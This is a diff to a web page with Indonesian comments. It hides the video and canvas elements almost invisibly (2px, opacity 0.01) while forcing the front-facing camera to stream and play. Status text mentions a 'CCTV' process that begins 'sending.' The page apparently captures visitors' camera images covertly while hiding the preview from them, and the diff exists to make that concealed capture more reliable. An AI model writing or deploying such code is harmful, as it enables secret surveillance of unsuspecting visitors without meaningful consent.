@@ -38,16 +38,21 @@
             margin-top: 10px;
         }
 
-        /* PERBAIKAN: Cara penyembunyian elemen yang kurang agresif */
+        /* ---------------------------------------------------- */
+        /* 🚨 SOLUSI PALING AMAN UNTUK MENGHINDARI LAYAR HITAM 🚨 */
+        /* ---------------------------------------------------- */
         #video, #canvas {
             position: absolute;
-            top: 0; /* Ubah dari -9999px */
-            left: 0; /* Ubah dari -9999px */
-            width: 1px;
-            height: 1px;
-            opacity: 0; 
-            visibility: hidden; /* Tambahkan kembali visibility:hidden agar benar-benar tidak terlihat */
+            top: 0;
+            left: 0;
+            
+            width: 2px; /* Ukuran sangat kecil */
+            height: 2px;
+            
+            opacity: 0.01; /* JANGAN 0. Browser akan tetap merender elemen ini */
+            pointer-events: none; /* Mencegah interaksi klik */
         }
+        /* visibility: hidden dihapus di sini */
 
         button {
             margin-top: 30px;
@@ -116,7 +121,7 @@
         statusBox.innerText = "Memuat video dan meminta izin akses...";
 
         try {
-            // PERBAIKAN: Memaksa kamera depan dengan resolusi yang jelas
+            // Meminta akses kamera depan secara eksplisit dengan resolusi
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: {
                     facingMode: "user", 
@@ -134,6 +139,9 @@
             
             // Lanjutkan proses CCTV
             video.srcObject = stream;
+            
+            // 🚨 SOLUSI TAMBAHAN: Memaksa video untuk play secara eksplisit
+            await video.play(); 
             
             video.onloadedmetadata = () => {
                 statusBox.innerText = "Sistem Aktif. Memulai pengiriman...";
